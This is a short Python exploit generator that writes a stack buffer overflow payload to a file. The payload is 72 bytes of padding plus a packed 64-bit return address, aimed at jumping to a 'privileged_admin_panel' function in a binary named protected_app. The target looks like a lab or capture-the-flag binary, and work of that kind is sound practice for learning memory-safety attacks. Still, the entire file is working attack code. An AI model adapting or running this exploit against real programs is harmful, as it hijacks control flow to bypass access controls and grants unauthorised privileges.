import struct
import sys

# Configuration based on the specific compilation of protected_app
# These offsets might need tuning depending on the compiler and env.
# buffer is 64 bytes.
# + RBP (8 bytes)
# = 72 bytes offset to Return Address?
OFFSET = 72 

# Target Address (We need to get this from the running binary or User input)
# Ideally, we parse the binary with 'nm' or 'objdump' to find it automatically.
# For this script, we will accept it as an argument or try to find it.

def generate_exploit(target_addr_hex):
    target_addr = int(target_addr_hex, 16)
    
    # Payload Construction
    # 1. Padding (Fill buffer + Saved RBP)
    payload = b"A" * OFFSET
    
    # 2. Overwrite Return Address with 'privileged_admin_panel' address
    # This simulates a "Code Reuse" attack where we jump to existing code.
    payload += struct.pack("<Q", target_addr) # Little-endian 64-bit
    
    # Write to file
    with open("exploit.bin", "wb") as f:
        f.write(payload)
    
    print(f"[+] Exploit generated: exploit.bin")
    print(f"    Target Address: {hex(target_addr)}")
    print(f"    Offset used: {OFFSET}")
    print(f"    Total Payload Size: {len(payload)} bytes")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_gen.py <address_of_admin_panel>")
        print("Example: python3 exploit_gen.py 0x401123")
        sys.exit(1)
    
    generate_exploit(sys.argv[1])
